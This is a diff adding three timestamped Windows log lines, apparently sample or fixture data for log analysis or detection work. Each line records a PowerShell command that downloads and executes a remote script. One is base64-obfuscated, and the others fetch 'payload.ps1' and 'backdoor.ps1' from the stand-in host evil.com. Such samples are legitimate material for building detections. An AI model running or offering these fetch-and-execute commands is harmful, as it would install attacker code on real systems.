@@ -1,0 +1,3 @@
+2026-08-22 21:10:12 WIN-01 powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
+2026-08-22 21:10:20 WIN-01 powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+2026-08-22 21:10:35 WIN-01 powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/backdoor.ps1')
